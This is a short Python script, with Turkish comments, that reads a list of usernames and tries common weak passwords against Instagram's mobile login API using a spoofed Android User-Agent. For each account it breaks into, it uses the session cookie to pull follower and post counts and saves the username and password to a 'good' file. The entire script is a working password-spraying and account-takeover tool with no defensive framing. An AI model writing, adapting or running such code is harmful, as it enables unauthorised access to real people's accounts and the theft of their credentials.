import requests, json, time, os
from colorama import Fore, init
init(autoreset=True)

# Bilgi sayaçları
toplam = 0
basarili = 0
basarisiz = 0

# Şifre listesi
passwords = ["123456", "12345678"]

# Kullanıcı adı dosyasını sor
dosya_yolu = input(">> Kullanıcı adı listesi yolunu girin (sadece username): ")

if not os.path.exists(dosya_yolu):
    print(Fore.RED + "[!] Dosya bulunamadı.")
    exit()

with open(dosya_yolu, 'r') as file:
    usernames = [line.strip() for line in file if line.strip()]

# Sonuçları kaydetme dosyası
good_path = "/storage/emulated/0/Download/Telegram/good_ig_users.txt"

def login_and_info(username, password):
    global basarili, basarisiz, toplam

    toplam += 1
    print(Fore.YELLOW + f"[{toplam}] D deneniyor: {username} | {password}")

    url = "https://i.instagram.com/api/v1/accounts/login/"

    headers = {
        "User-Agent": "Instagram 113.0.0.39.122 Android",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    }

    data = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password}',
        'queryParams': '{}',
        'optIntoOneTap': 'false'
    }

    try:
        r = requests.post(url, headers=headers, data=data, timeout=10)

        if "logged_in_user" in r.text:
            basarili += 1
            print(Fore.GREEN + f"[✓] Başarılı: {username} - {password}")

            try:
                user_id = r.json()['logged_in_user']['pk']
                token = r.cookies.get('sessionid')

                # Kullanıcı bilgilerini çek
                bilgi_url = f"https://i.instagram.com/api/v1/users/{user_id}/info/"
                bilgi_headers = {
                    "User-Agent": "Instagram 113.0.0.39.122 Android",
                    "Cookie": f"sessionid={token}"
                }
                bilgi = requests.get(bilgi_url, headers=bilgi_headers).json()
                takipci = bilgi['user']['follower_count']
                takip = bilgi['user']['following_count']
                post = bilgi['user']['media_count']

            except:
                takipci = takip = post = "None"

            with open(good_path, 'a') as good_file:
                good_file.write(f"Username: {username}\nŞifre: {password}\nTakipçi: {takipci}\nTakip: {takip}\nPost: {post}\n\n")

        else:
            basarisiz += 1
            print(Fore.RED + f"[✗] Başarısız: {username} - {password}")
    except Exception as e:
        print(Fore.RED + f"[!] Hata: {e}")
        basarisiz += 1

for user in usernames:
    for sifre in passwords:
        login_and_info(user, sifre)
        time.sleep(1)

print("\n--- TAMAMLANDI ---")
print(Fore.CYAN + f"Toplam Deneme: {toplam}")
print(Fore.GREEN + f"Başarılı: {basarili}")
print(Fore.RED + f"Başarısız: {basarisiz}")